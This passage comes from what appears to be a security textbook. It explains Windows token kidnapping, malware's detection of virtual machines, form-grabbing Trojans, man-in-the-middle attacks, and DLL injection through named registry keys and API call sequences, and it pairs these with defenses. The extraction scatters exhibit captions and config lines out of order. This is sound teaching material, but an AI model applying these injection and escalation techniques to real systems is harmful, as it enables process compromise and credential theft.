applies to a process and not an impersonation token that corresponds 
to a thread. Token kidnapping requires obtaining the PROCESS_
DUP_HANDLE permission to duplicate the privileged token; how­
ever, because services typically handle connections and requests in 
threads within the process, token kidnapping has to start with the 
thread’s impersonation tokens.
[Word Count: 72]

The impersonation token must have THREAD_SET_CONTEXT 
and THREAD_QUERY_INFORMATION access rights to obtain 
the process’ token. A token with the THREAD_SET_CONTEXT 
permission provides the ability to send asynchronous procedure 
calls. An impersonation token with the THREAD_QUERY_
INFORMATION permission allows opening the token that the 
thread is currently impersonating.
[Word Count: 47]

Using 
asynchronous 
procedure 
calls—specifically, 
the 
QueueUserAPC function—allows a thread to execute any functions 
loaded within the process. The use of QueueUserAPC to call the 
ImpersonateSelf function within the process assigns the process’ token 
to the thread. Thanks to the THREAD_QUERY_INFORMATION 
permission, the thread can use the process’ token to gain access to the 
PROCESS_DUP_HANDLE.
[Word Count: 54]

Once the PROCESS_DUP_HANDLE is available, a token-kid-
napping opportunity presents itself. Duplicating the handle to the 
higher privileged token, such as the system level, provides privilege 
escalation and complete system compromise. Exhibit 4-21 shows a 
screenshot of an iDefense-created token-kidnapping utility that is 
elevating privileges from those of a user named w4nt4 to those of 
SYSTEM using the process previously discussed.
[Word Count: 61]

Exhibit 4-21  Successful privilege escalation from token kidnapping.
[Word Count: 8]

The above process allows exploitation of Windows by any user with 
the SeImpersonate privilege; Microsoft released the MS09-012 advi­
sory to address this issue. This advisory makes architectural changes to 
thwart token kidnapping related to the CVE-2009-0079 and CVE-
2009-0078 vulnerabilities. Both of these classify as service isolation 
vulnerabilities because they allow two services running with the same 
identity to access each other’s tokens.37
[Word Count: 64]

right, and it should be restricted so that only users and groups that 
require it have the privilege.
[Word Count: 18]

Malware analysts routinely use virtual machines (VMs) when ana­
lyzing malicious code samples. This section addresses the way an 
application, particularly a malicious application, can detect when it 
is running inside a virtual machine environment (VME) to change 
or terminate the application’s behavior to avoid giving up the applica-
tion’s secrets in environments in which security researchers frequently 
conduct malware analysis.
[Word Count: 61]

The use of virtual machines allows analysts to run malicious code 
without the risk of purposely infecting the analyst’s real workstation 
and servers. The use of virtual machines in honeypots gives analysts 
the ability to run a multitude of vulnerable configurations without the 
expense and administrative overhead associated with the deployment 
of a large server farm; however, the use of virtual machines by analysts
[Word Count: 64]

Exhibit 4-22  Users with SeImpersonate privilege enabled.
[Word Count: 7]

has not gone unnoticed by malware authors. While still a relatively 
small sample size, several families of malware are “VM aware.”
[Word Count: 21]

4.2.8.1  Fingerprints Everywhere!  Virtual machines rely on a host 
application known as the virtual machine monitor (VMM). The 
VMM, as described in Section 1.1.7 is responsible for providing the 
glue between the host machine and the virtual machines. The VMM 
attempts to provide a realistic copy of actual hardware architecture 
while at the same time providing suitable performance. To that end, 
the VMM makes certain concessions.
[Word Count: 66]

A variety of different methods exist to create the VME within the 
confines of the host machine. The VMM may use full virtualization, 
paravirtualization, hardware-assisted virtualization, operating-system-
assisted virtualization, or emulation. Each of these techniques requires 
the VMM to make adjustments to the VME for the underlying host 
machine to support the VME. Applications, typically malicious appli­
cations, may find one of the easiest identifiable fingerprints left behind 
in this process in the virtual devices generated by the VMM.
[Word Count: 79]

The identifiers found in VMware virtual devices are consistent 
regardless of the method by which a user configures VMware with 
regard to virtualization versus emulation; therefore, if the user spe-
cifically configures VMware such that the VM is effectively running 
in emulation mode (instead of a virtualization mode), an application
[Word Count: 50]

can still easily identify the fact that it is running inside a VME. Tools 
to detect the presence of these identifiable strings in the guest OS’ 
Windows registry have been available since 2003. Tobias Klein’s VM 
detection kit, Scooby Doo,34 is an early example of detecting VMEs 
using the strings method.
[Word Count: 51]

Strings alone are not reliable indicators of the presence of a VME. 
Researchers have found that by using a hex editor, a skilled adminis­
trator can relabel the virtual devices generated by the VMM to the 
point that the string method for identifying VMEs is ineffective. 
Depending on the complexity of the method, simple changes such as 
changing VMware to rawMV in the virtual application’s binaries and 
supporting files can easily defeat tools that look for string matches.
[Word Count: 78]

4.2.8.2  Understanding the Rules of the Neighborhood  When the VMM 
uses virtualization instead of emulation to generate the VME, the
[Word Count: 20]

Exhibit 4-23  VMware-labeled devices in a VMware workstation virtual machine.
[Word Count: 10]

VMM must make specific modifications to the guest OS that would 
otherwise seem inconsequential. Using VMware as the example vir­
tual application again, in its default configuration, VMware utilizes 
the host machine’s processor to execute CPU instructions from the 
guest OS inside the VME. This type of virtualization allows the 
VME to operate and respond more rapidly than when configured to 
run in emulation-only mode; however, the use of the host CPU to 
run the guest OS causes certain conditions to exist in the VME that 
would not otherwise exist in a real machine.
[Word Count: 94]

Special tables known as the local descriptor table (LDT) and the 
global descriptor table (GDT) provide the necessary information for 
the CPU to map physical memory to virtual addresses. These tables 
give the CPU enough information to map every memory address 
available to the physical memory. The processor uses two special reg-
isters to hold the location of these two tables. Intel identifies these 
registers as the local descriptor table register (LDTR) and the global 
descriptor table register (GDTR).
[Word Count: 79]

The CPU has the limitation that only one set of GDTs and LDTs 
are active at any given time. This is a problem when running more than 
one operating system at the same time on the same physical machine.
[Word Count: 39]

4.2.8.3  Detecting Communication with the Outside World  Virtual appli­
cation developers use special attributes of the VME to facilitate com-
munication and interoperability between the VME and the host 
machine’s operating system. It is these attributes that allow users to 
drag and drop files between the host machine’s operating system and 
the guest OS. It is also these attributes that give applications the abil-
ity to detect the presence of a VME.
[Word Count: 72]

VMware includes a communication input–output (I/O) port to 
provide a direct communication channel between the guest OS and 
the host machine. Known as the ComChannel, the I/O allows the 
VMware tools package to provide interoperability between the guest 
and the host. The I/O port used by the ComChannel is specific to 
VMware’s VMEs. The same I/O location on a real machine does not
[Word Count: 63]

exist. By initiating communication with this I/O port, an application 
can quickly determine the presence of a VME.
[Word Count: 18]

4.2.8.4  Putting It All Together  Klein updated his Scooby Doo package 
in 2008 to increase the effectiveness of detecting a VME. Known as 
ScoobyNG, the VME detection system performed the following tests:
[Word Count: 32]

1.	IDT test
	
2.	LDT test
	
3.	GDT test
	
4.	Incorrect response to standard processor instruction test
	
5.	ComChannel “version” test
	
6.	ComChannel “memory size” test
	
7.	Incorrect “near execution transfers” emulation test (NEAR
[Word Count: 34]

On a default installation of VMware, ScoobyNG is highly effective at 
determining the presence of a VMware VME. ScoobyNG generates 
six out of seven positive responses when applied to a default VMware 
VME, as seen in Exhibit 4-24.
[Word Count: 38]

Without significant modifications to the VMware VME, an appli-
cation can determine the presence of the VME regardless of the VME’s 
mode (emulation or virtualization). When VMware VMM uses vir-
tualization, the IDT, LDT and GDT tests will reveal the VME. 
When the VMM uses emulation, the NEAR jump test will give away 
the VME. Combined, these two sets of tests give suitable coverage to 
allow an application to determine the presence of a VME.
[Word Count: 75]

Exhibit 4-24  ScoobyNG testing a default VMware VME.
[Word Count: 8]

4.2.8.5  The New Hope  Despite the shortcomings in the VMEs, it is 
possible to configure virtual applications such as VMware to prevent 
VME detection. Administrators and users can reconfigure a VMware 
VME in a relatively short period of time to pass many of the VME 
tests. Using the settings in Exhibit 4-25, six of the seven ScoobyNG 
tests will fail to reveal the presence of the VMware VME, as would 
VmDetect. Administrators could apply similar settings to other vir­
tual applications. Exhibit 4-26 shows the result of these settings from 
the perspective of ScoobyNG and VmDetect.
[Word Count: 96]

4.2.8.6  Conclusion  Applications can exhibit unique behavior or 
simply fail to operate when running in a VME. The ways in which 
malware authors can detect the presence of a virtual machine are con-
tinuing to grow, giving malware authors more ways to prevent their 
creations from running in VMEs. Fortunately, while the number 
of tests increases, the number of workarounds to defeat these tests 
quickly catches up.
[Word Count: 67]

4.3  Stealing Information and Exploitation
[Word Count: 5]

Key logging, once the favored method of capturing user input, has 
largely given way to form-grabbing Trojans, which provide much 
cleaner, better structured data. Whereas key loggers target keystrokes 
and therefore miss sensitive data that a user may paste into a form or 
select via an options dropdown, form grabbers target Web applications
[Word Count: 53]

isolation.tools.getPtrLocation.disable = “TRUE”
[Word Count: 3]

isolation.tools.setPtrLocation.disable = “TRUE”
[Word Count: 3]

isolation.tools.setVersion.disable = “TRUE”
[Word Count: 3]

isolation.tools.getVersion.disable = “TRUE”
[Word Count: 3]

monitor_control.disable_directexec = “TRUE” monitor_control.disable_chksimd = “TRUE”
[Word Count: 6]

monitor_control.disable_selfmod = “TRUE”
[Word Count: 3]

monitor_control.disable_btinout = “TRUE”
[Word Count: 3]

monitor_control.disable_btmemspace = “TRUE”
[Word Count: 3]

These configuration options prevent the VME from
[Word Count: 7]

using the host processor for direct code execution.
[Word Count: 8]

Essentially, these configuration options place the
[Word Count: 6]

ComChannel
monitor_control.restrict_backdoor = “TRUE”
These configurations disable the ComChannel
[Word Count: 9]

port, preventing VM detection code from using the
[Word Count: 8]

Exhibit 4-25  VMware configurations to reduce VME detection.
[Word Count: 8]

by capturing the form’s data elements before the user submits it. In 
this way, a form grabber yields the same key and value pairs received 
by the Web application, thereby assuring accurate and complete infor­
mation. Several families of malicious code employ this technique, and 
defending against it requires preventing the initial installation of the 
Trojan via antivirus signatures and limiting user privileges to prevent 
the installation of browser helper objects (BHOs).
[Word Count: 72]

Once deposited on a system, Trojan horses can steal data from a 
system using many methods. For years, key loggers reigned as the 
kings of data theft, but key log data can be messy and the technique 
misses any data the user adds without using the keyboard. This sec­
tion explains form grabbing, a more precise data theft technique that 
modern malicious code targeting Web browsers commonly uses.
[Word Count: 68]

Exhibit 4-26  ScoobyNG and VmDetect after applying VME detection prevention configuration.
[Word Count: 11]

value, as the user enters this value using a dropdown list. To solve this 
problem, clever attackers invented a technique best known as form grab­
bing, as the Trojan “grabs” the form before the user submits it and then 
reports it to a command-and-control (C&C) server.
[Word Count: 46]

While key loggers typically record data for all programs on a sys­
tem, form grabbers are specialized and only target data sent through a 
Web browser. When a user submits a Web form, such as those used to 
log onto a website, his or her Web browser generates an HTTP POST 
request that sends the data entered to the site. These data are normally 
encrypted using transport layer security (TLS) since it is very insecure 
to transmit logon and password data in cleartext. Form grabbers work 
by intercepting the POST data before the data pass through encryp­
tion routines.
[Word Count: 99]

Capturing the data at this stage has multiple advantages. Unlike 
key loggers, a form grabber will capture the “state” field in the form 
shown in Exhibit 4-27. The attacker will also capture precisely what 
the user intended to submit. If the user made a typo when writing his 
or her password and corrected it, a key logger might capture the fol-
lowing text:
[Word Count: 63]

While the key logger captured the entire password, it only recorded 
the keys the user typed and must reconstruct them and perform
[Word Count: 22]

Exhibit 4-27  An example input form with a dropdown list.
[Word Count: 10]

additional analysis to determine that this is the user’s password. Form 
grabbers not only solve problems caused by typos, and copy and paste, 
but also capture the names of the variables that the Web page uses to 
define the data. Exhibit 4-28 is an example of the data captured by the 
Nethell/Limbo Trojan.
[Word Count: 53]

To grab forms, a Trojan places itself between the Web browser 
and the networking stack, where valuable information passes through 
encryption functions before transmission. There are many ways for a
[Word Count: 30]

URL
[https://login.facebook.com/login.php?login_attempt=1]
[Word Count: 2]

Exhibit 4-28  Data captured by the Nethell/Limbo Trojan.
[Word Count: 8]

Trojan to do this. The networking stack is software provided by the 
operating system that other programs use to send information across 
the Internet.
[Word Count: 24]

Malicious actors use the most common form grabber in the wild 
today, Zeus, primarily to target online banking websites. Zeus and 
most other form grabbers report stolen data by sending HTTP POST 
messages to a C&C server configured by the attacker. This server takes 
the information and stores it in files or a database that the attacker can 
search to retrieve valuable credentials.
[Word Count: 63]

This section explains the technical concepts and detection techniques 
of, and methods of protection against, man-in-the-middle (MITM)
[Word Count: 17]

attacks; what type of communications channels are vulnerable; and 
what users can do to mitigate the threat of such attacks.
[Word Count: 20]

MITM attacks allow an actor to intercept, view, and alter sen­
sitive data. MITM is a generic type of attack whereby an attacker 
inserts him or herself between the victim and the intended party 
during communication. Attackers may launch MITM attacks to 
enhance exploitation, steal information, defeat authentication sys­
tems, and masquerade or take actions as victims. In Exhibit 4-29, 
the attacker (Charlie) performs a MITM attack that withdraws all of 
Bob’s remaining balance.
[Word Count: 74]

MITM attacks often involve the attacker proxying requests, like 
the original question and answer to “What is Bob’s balance” in Exhibit 
4-29. In this way, the victim and the bank do not realize they are 
actually communicating with a fraudulent party because the answers 
are reasonable. In a MITM attack, each request and reply, which the 
attacker can modify or replace, goes through the attacker.
[Word Count: 65]

3. Victim’s $1,000 Balance is
Transmitted to the Attacker
[Word Count: 9]

4. Attacker Withdraws
$1,000 from
Victim’s Account
[Word Count: 7]

5. Victim’s $1,000 Balance Appears
to be Transmitted to the Victim
[Word Count: 11]

2. Attacker Requests Victim’s
Balance from the Bank
1. Victim Requests Balance from
the Bank
[Word Count: 15]

Exhibit 4-29  Charlie performs a man-in-the-middle (MITM) attack against Bob and his bank.
[Word Count: 13]

other protocols, such as DNS, can facilitate MITM attacks against 
specific domain names. If an attacker is able to resolve a domain name 
to an IP address he or she controls instead of its actual address, then 
the victim will communicate with the attacker’s server instead of the 
intended server.
[Word Count: 50]

Examples of malicious code families that use network-based 
MITM attacks include Snow.A, Netsniff, and Arpiframe. Snow.A 
installs the WinPCAP driver and performs ARP poisoning to inter­
cept and monitor traffic. While Netsniff attempted to send spoofed 
DNS traffic, others like Arpiframe used MITM attacks to spread 
exploits by appending IFrames to all requested pages. If Arpiframe 
infects one server, all other servers on the same network will also 
deliver exploits.
[Word Count: 70]

Connecting to untrusted networks is dangerous for similar reasons, 
because a single malicious client or infected user could launch MITM 
attacks against all other users on the same network. Attackers could 
also launch MITM attacks by offering free wireless networks; such 
attacks have high hardware costs if attackers plan to target many dif­
ferent locations. Users should not trust external networks, and should 
use secure protocols like HTTPS, which allows users to authenticate 
the server and encrypt data to prevent eavesdropping.
[Word Count: 81]

Attackers also use MITM attacks while phishing when the phish­
ing tool used acts as a proxy to the real server. Phishing websites often 
do not use HTTPS; therefore, users do not have a strong way to verify 
the server’s identity using the server’s certificate. If users provide their 
information to a phishing website despite the lack of server identity 
information, attackers will have access to the user’s current session. 
Financial institutions can detect a large number of successful logon 
attempts from the same IP address to identify a potential phishing 
website acting as a proxy for MITM attacks.
[Word Count: 99]

On a larger scale, attackers could target routers in an attempt to 
reconfigure the way they route traffic. As an example, a known vul-
nerability in 2Wire modems that certain ISPs in Mexico offer to more 
than 2 million users allowed an attacker to reconfigure DNS set-
tings whenever the user’s browser or mail client rendered a malicious 
HTML tag. In this example, attackers reconfigured the IP address 
for banamex.com to an attacker-controlled server.39 If a user connects 
to the legitimate website via http://banamex.com while affected by
[Word Count: 87]

this configuration, the user would interact with the attacker’s server 
instead of the real one.
[Word Count: 15]

To deter attackers from using stolen credentials, organizations often 
require multiple forms of authentication, including one-time PINs 
(OTPs), which are time based and change each time the user logs on. 
These measures, while effective against certain kinds of attacks, are 
not effective at preventing MITM attacks. A MITM attack allows 
the attacker to alter traffic after a user logs onto a target website of 
interest. If the attacker wanted to gain more information from the 
user, the attacker could relay extra traffic to the client or take different 
actions as the client when communicating with the server.
[Word Count: 97]

ARP, DNS, phishing, and infrastructure MITM attacks are a few 
of the examples that explain how attackers inject themselves between 
a victim and another server. Upon injecting themselves in the mid­
dle, attackers can have varying motivations. Usually, attackers want 
to steal information, modify transactions, or enhance exploitation 
through appending IFrames with exploits to all HTTP replies.
[Word Count: 57]

If an attacker attempts to intercept HTTPS traffic and send it to a 
server that he or she controls, the user might see the warnings shown 
in Exhibit 4-30 instead of the legitimate website. Upon viewing one of 
these warnings, users should recognize that an attacker might be trying 
to launch a MITM attack. For resources that do not use cryptographi-
cally strong protocols, there is no protection against MITM attacks. 
Websites that mix both HTTP and HTTPS are easier for attack-
ers to target because attackers can rewrite all HTTPS links to their
[Word Count: 94]

nonsecure HTTP counterparts, provided the user accesses at least one 
HTTP page during the session. For this reason, financial institutions 
should offer websites with HTTPS-only options and encourage users 
to connect to HTTPS versions of their websites before entering user 
credentials. Even one unsecured page could allow attackers to perform 
a MITM attack or perform an action on behalf of the user after he or 
she logs on. Some websites only use HTTPS when the user supplies 
credentials but do not protect other session information, which can be 
just as valuable to attackers using MITM attacks.
[Word Count: 96]

Users must authenticate the servers with which they wish to com­
municate and use cryptographically strong protocols to communicate. 
HTTPS and secure shell (SSH) are preferable to HTTP and telnet 
when exchanging critical information. Software clients for protocols 
like SSH cache the server’s signature after the user first connects. If 
the signature differs from the locally cached version, then the client 
will raise a warning, indicating that the server’s certificate changed 
and possibly that a MITM attack is taking place.
[Word Count: 80]

4.2.3.2  Conclusion  Using encryption and certificates are effective 
ways to prevent MITM attacks from being successful, provided 
users authenticate servers appropriately. While administrators can 
make changes to their own networks to prevent ARP and DNS
[Word Count: 35]

Exhibit 4-30.  An untrusted connection in Firefox (top) and Internet Explorer (bottom).
[Word Count: 12]

spoofing, they can do little to prevent the dangers of using external, 
untrusted networks. Organizations should make HTTPS-only ver­
sions of their websites available for whenever their customers wish 
to access them from untrusted networks. Users can use secure tun­
nels and proxies to limit the potential dangers of malicious external 
networks for all of their traffic. This will limit the effectiveness of 
MITM attacks and prevent unwanted disclosure and modification 
of data.
[Word Count: 73]

Through the use of dynamic link libraries (DLLs), attackers are able 
to inject malicious activity into existing processes and applications. 
The compromised application continues to appear as a legitimate pro­
cess, thereby bypassing application firewalls and requiring sophisti­
cated tools to detect the malicious code. DLL injection poses a serious 
threat to the user and permits the attacker to steal the parent process 
data, which in many cases results in the theft of account credentials.
[Word Count: 75]

The Windows operating system uses dynamic link libraries (DLLs) 
to add functionality to applications. DLLs modularize applications 
by offering precompiled libraries that all programs share. An applica­
tion using a DLL does not bundle the libraries up and include them 
within its compiled code. Instead, the application imports the library 
to use functions within the DLL. This shared library implementa­
tion provides many beneficial features, such as code reuse, but exposes 
applications to the introduction of malicious DLLs. This section 
explains how to include a malicious DLL in an application by using a 
technique known as DLL injection.
[Word Count: 98]

Malicious code authors strive to steal information from or perform 
other malicious deeds on a compromised system. While carrying out 
this activity, they also attempt to hide their presence to lengthen the 
period in which the system remains in their control. DLL injection, 
which involves loading a malicious DLL into other processes, can 
achieve all of these tasks.
[Word Count: 58]

Injecting a DLL into another process allows an attacker to gain 
access to the process and its memory. The result of a successful injec-
tion is a complete compromise of the process by providing free reign 
to the DLL. This allows the DLL to monitor, alter, and steal elements
[Word Count: 49]

from within the process and carry out actions under the guise of the 
application.
[Word Count: 14]

DLL injection also provides an avenue to hook Windows appli­
cation programming interface (API) functions. By hooking these 
functions, the malicious DLL can monitor calls and alter interaction 
between the process and the kernel. This gives the DLL rootkit capa­
bilities, as it can hide files and other contents on the system that the 
malicious code author does not want exposed.
[Word Count: 61]

The impact of DLL injection on a system is very high and is trivial 
to carry out successfully with elevated privileges. A few methods are 
available to inject DLLs into processes, and each varies in complex­
ity and depends on the targeted process and the context in which the 
library injection originates. One simple way to inject a DLL into a 
process is by modifying the Windows Registry.
[Word Count: 68]

4.3.3.1  Windows Registry DLL Injection  One of the easiest ways to 
perform DLL injection is through Windows Registry modifications. 
In Windows NT4, 2000, and XP, AppInit_DLLs is a registry key 
commonly used to inject DLLs into processes. The full path to the 
AppInit_DLLs registry entry is as follows:
[Word Count: 48]

HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\
CurrentVersion\Windows\AppInit_DLLs
[Word Count: 2]

This key includes a list of DLLs that load into all processes in the 
current logged-on session. The user32.dll library, responsible for the 
Windows user interface, loads the listed DLLs in AppInit_DLLs 
during the DLL_PROCESS_ATTACH process. Therefore, all pro­
cesses that link to user32.dll, which omits very few user mode applica-
tions, include the DLL within the AppInit_DLLs registry key when 
the process starts.
[Word Count: 64]

This method does not work by default in the Vista operating sys-
tem, as Microsoft did not carry over the AppInit_DLLs functionality 
due to the negative implications it presented. Vista uses a registry key 
called LoadAppInit_DLLs that requires extra permissions; however, 
the attacker can restore the original AppInit_DLLs functionality 
discussed above by setting the LoadAppInit_DLLs value to 1.
[Word Count: 58]

In addition to AppInit_DLLs, the undocumented registry key 
ShellServiceObjectDelayLoad can inject a DLL into the Windows
[Word Count: 16]

Explorer process. The ShellServiceObjectDelayLoad registry key 
contains critical DLLs, such as stobject.dll for the system tray, to 
load into the Explorer process for Windows to operate properly. To 
use the ShellServiceObjectDelayLoad key for injection, a component 
object model (COM) object, used to allow communication between 
different pieces of software on the system, must link the DLL to a 
unique class identifier. Once the link exists, the class identifier added 
to the ShellServiceObjectDelayLoad key will load the DLL into 
the Explorer process when the system starts. The full path to the 
ShellServiceObjectDelayLoad registry key is as follows:
[Word Count: 96]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\
CurrentVersion\ShellServiceObjectDelayLoad
[Word Count: 2]

Another registry entry that allows DLL injection uses the Notify 
key within the Winlogon entry. Winlogon is responsible for interac­
tive logon for Windows and uses notifications to handle events. The 
Notify key loads DLLs that handle events such as startup, shutdown, 
and lock. By listing a malicious DLL in the Notify key, the library 
will load into the Winlogon process during system startup. The full 
path to the Winlogon Notify key is as follows:
[Word Count: 75]

HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\
CurrentVersion\Winlogon\Notify
[Word Count: 2]

A DLL injection method used by the Coreflood Trojan modifies 
the registry key ShellIconOverlayIdentifier. This registry key con­
tains icon overlay handlers, which allow the Windows shell to over-
lay images onto icons. Exhibit 4-31 displays an example of such an 
overlay when creating a shortcut on the desktop to an executable. The 
shortcut icon places an arrow in the lower-left corner of the execut-
able’s icon.
[Word Count: 67]

The icon overlay handlers are DLLs that export the interface to 
facilitate the overlay, but DLLs listed in the ShellIconOverlayIdentifier 
key load regardless of whether they provide this interface. Malicious
[Word Count: 30]

Exhibit 4-31  A shortcut icon with overlay.
[Word Count: 7]

DLLs dropped into the Windows system directory and added to this 
registry key load into Explorer at startup, resulting in a successful injec­
tion. The path to the ShellIconOverlayIdentifier key is as follows:
[Word Count: 33]

SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
ShellIconOverlayIdentifiers
[Word Count: 2]

An option for attackers to inject a DLL into Internet Explorer is 
available using a browser helper object (BHO). Microsoft created 
BHOs to allow customized code to interact with Internet Explorer.40 
The implementation provided simple integration, as installation only 
requires a registry key with the path to the DLL. The path to the BHO 
registry key to inject a DLL into Internet Explorer is as follows:
[Word Count: 66]

SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
BrowserHelperObjects
[Word Count: 2]

4.3.3.2  Injecting Applications  In addition to DLL injection through 
registry modifications, malicious applications can inject DLLs into 
other processes. Malicious code that injects DLLs is common and 
typically loads these DLLs into processes as it installs onto the sys-
tem. These malicious programs typically follow the same procedures 
to load a malicious DLL into a remote process. The diagram shown in 
Exhibit 4-32 visually exemplifies the typical steps involved with DLL 
injection. The steps include opening the targeted process, allocating 
memory in the process for the DLL’s path, writing the DLL’s path to
[Word Count: 93]

4. Create Remote Tread to
 
Load Library
[Word Count: 7]

Exhibit 4-32  The dynamic link library (DLL) injection process.
[Word Count: 9]

the process, and, finally, creating a remote thread to load the DLL in 
the process.
[Word Count: 15]

DLL-injecting malicious code begins by opening the targeted pro­
cess. By opening the targeted process, the malicious code can inter­
act with the process and run further commands. A rogue application 
opens a process using the OpenProcess Windows API function, which 
returns an open handle to the process back to the calling application. 
The malicious code uses this handle in further function calls as it is a 
pointer to the targeted process.
[Word Count: 72]

When obtaining the process’ handle, the OpenProcess function 
also includes a desired access parameter. The desired access parameter 
contains the access rights that the calling process needs in the targeted 
process. The OpenProcess function needs to obtain PROCESS_
CREATE_THREAD, PROCESS_QUERY_INFORMATION, 
PROCESS_VM_OPERATION, PROCESS_VM_WRITE, and 
PROCESS_VM_READ access rights to successfully carry out sub­
sequent functions within the process.
[Word Count: 56]

Windows grants access rights after checking the malicious code 
process’ token for adequate privileges and generates a handle to the 
process with the desired access rights. If the user running the mali­
cious code has the SeDebugPrivilege enabled on his or her token, the 
OpenProcess function grants access and requested rights to the user 
without checking the security descriptor. Obtaining the appropriate 
access rights is important in the following steps, as the subsequent 
interaction with the target process requires particular permissions. 
Inadequate permissions will cause the entire DLL injection process 
to fail.
[Word Count: 92]

The next step in this technique allocates memory in the targeted 
process to store the path to the DLL. This allows the injecting appli-
cation to provide the targeted process with the path on disk to the 
DLL. To allocate memory in the targeted process, the injecting pro-
cess uses the VirtualAllocEx Windows API function with a speci-
fied size large enough to contain the DLL’s path. The VirtualAllocEx 
function requires the PROCESS_VM_OPERATION permission 
obtained during the initial OpenProcess function.
[Word Count: 80]

Once the injecting process allocates memory in the targeted pro-
cess, it writes the DLL’s path on disk to the memory location. The 
injecting process uses the WriteProcessMemory Windows API
[Word Count: 30]

function and the memory location returned by the VirtualAllocEx 
function to write the path to the DLL. To successfully write to the 
memory location, the WriteProcessMemory function requires the 
PAGE_READWRITE access right set during memory allocation.
[Word Count: 36]

4.3.3.3  Reflective DLL Injections  Applications that inject DLLs into 
processes call the LoadLibrary function, with the exception of the 
registry modifications discussed, because it simplifies loading librar­
ies into a process; however, this function adds the name of the DLL 
to a list of loaded modules in the process environment block. The 
process environment block is a data structure that every running 
process has that contains user mode information associated with the 
process. This structure includes a list of loaded libraries, which can 
unearth injected DLLs.
[Word Count: 86]

Malicious code authors intent on hiding injected DLLs avoid list­
ing the library in the process environment block by using alternative 
means to load the library. An alternative process, known as reflec-
tive DLL injection, uses reflective programming to load a DLL from 
memory into a process without using the LoadLibrary function. This 
technique injects a DLL in a stealthy manner, as it does not have any 
ties to the process and omits the DLL from the loaded library list. 
Exhibit 4-33 compares using the LoadLibrary function to the reflec-
tive DLL injection process.
[Word Count: 94]

Reflective DLL injection incorporates a loading function that runs 
within the targeted process to mimic the LoadLibrary function. This 
loading function is a manual DLL loader that starts by allocating
[Word Count: 30]

memory in the process, followed by mapping the DLL code into the 
allocated memory. The loader then parses the process’ import address 
table (IAT), which contains all functions from imported libraries to 
populate the injected DLL’s IAT. The loading function also populates 
the DLL’s relocation table to make sure all of the memory addresses 
used within the DLL’s code are correct. Finally, the loading function 
creates a thread for the DLL’s entry point to start execution.
[Word Count: 76]

In reflective injection, the reflective loader does not register the 
loaded DLL within the process’ list of loaded modules. Exhibit 4-33 
shows that the reflective injection steps do not include adding the DLL 
to the loaded module list, which results in a concealed injection.
[Word Count: 44]

4.3.3.4  Conclusion  DLL injection is dangerous due to the effect it 
has on a system’s security. Successful injections allow malicious code 
to steal data from the process. For example, a banking Trojan could 
inject a DLL with form-grabbing capabilities into the Web browser 
to steal logon credentials.
[Word Count: 47]

All malevolent tasks carried out by the injected DLL use the guise 
of the injected process. By masquerading as a legitimate process, the
[Word Count: 23]

Exhibit 4-33  LoadLibrary versus reflective injection.
[Word Count: 6]

malicious DLL can successfully bypass application-based firewalls. 
The guise of a legitimate application makes detection difficult and 
requires tools that are more sophisticated. These tools require func­
tionality to view DLLs loaded into a process by LoadLibrary or pro­
vide the ability to analyze the virtual memory of a process to view 
DLLs loaded by reflective DLL injection.
[Word Count: 58]

To minimize the chances of successful DLL injection, adminis­
trators should assign the least privileges necessary to users’ accounts. 
The minimal privileges will reduce the ability to write registry entries 
and save DLLs to the system directory. An account with minimal 
privileges will not have the appropriate permissions within its token 
to open a remote process for injection; however, this does not thwart 
injection into processes using SeDebugPrivilege permission or any 
other injection attempts made after successful privilege escalation.
[Word Count: 79]

Browser helper objects (BHOs) are enormously useful, with most PCs 
having at least one installed; however, what was intended simply to 
extend the functionality of Microsoft’s Internet Explorer also increases 
the potential attack surface and has become a popular exploitation 
vector. This section explains what BHOs are and how attackers use 
them to their advantage.
[Word Count: 55]

In the late 1990s, the popularity of the World Wide Web was tak­
ing off and Microsoft Corporation decided to provide an alternate pro­
gramming interface (API) to allow developers to extend their popular 
Internet Explorer (version 4.0 at the time) browser. Its solution was the 
BHO, which is a normal Windows binary in the form of a DLL file 
capable of adding completely new functionality to Internet Explorer. 
In this section we explain how BHOs work and the impact they have 
had on the security posture of Windows and Internet Explorer.
[Word Count: 92]

Internet Explorer is currently the most widely used Web browser in 
the world. During the past ten years, BHOs have become a very pop-
ular way for Microsoft and third parties to add new functionality to 
the core browser. Some of the earliest and most prevalent BHOs are 
search tool bars that add an area containing search boxes and other 
features below the browser address bar. These programs are commonly 
associated with adware and spyware because their producers make
[Word Count: 79]

money by collecting information about the users’ browsing habits and 
displaying advertisements to the user. Exhibit 4-34 shows how the 
Alexa Toolbar appears when loaded in Internet Explorer.
[Word Count: 28]

BHOs are also commonly used to give Internet Explorer the capa­
bility to deal with file formats not normally displayed in a browser, 
such as PDFs. The Adobe Reader BHO is installed alongside the 
Adobe application to allow the browser to display a PDF inside the 
browser window rather than in a separate application. Exhibit 4-35 
shows an example of a PDF document displayed by the Adobe Reader 
BHO inside Internet Explorer.
[Word Count: 72]

4.3.4.1  Security Implications  BHOs provide new functionality to 
Internet Explorer, but as with any new functionality, they also pro-
vide new avenues for attackers to manipulate systems. During the 
past five years, the Web browser has become a common conduit 
for malicious code. Attackers can exploit a browser vulnerability to
[Word Count: 50]

Exhibit 4-34  The Alexa toolbar adds an additional toolbar to Internet Explorer.
[Word Count: 12]

Exhibit 4-35  A PDF file displayed by an Adobe browser helper object (BHO) inside Internet Explorer.
[Word Count: 16]

infect unknowing visitors to a page. BHOs process code alongside 
the browser, possibly introducing new vulnerabilities and increasing 
the browser’s attack surface. For instance, a vulnerability in Adobe 
Reader can be exploited through Internet Explorer if the Adobe BHO 
is installed. Microsoft can fix vulnerabilities in its code once they are 
discovered and use its automated update system to protect users, but 
the software vendor who produced the BHOs must update them.
[Word Count: 72]

Attackers not only take advantage of BHOs by exploiting vul­
nerabilities in them, but also develop their own BHOs to add mali­
cious functionality to Internet Explorer. The Nethell/Limbo and 
Metafisher/AgentDQ banking Trojans install BHOs that analyze 
each page the user visits to determine if it is one of those in its target 
list of online banking sites. Once it detects a targeted banking site, 
the Trojan can steal data from the page or even alter the page. Exhibit 
4-36 shows how the Nethell/Limbo Trojan alters a logon form to 
request additional information from the infected user.
[Word Count: 97]

Detecting BHOs is simple, as Internet Explorer provides an inter-
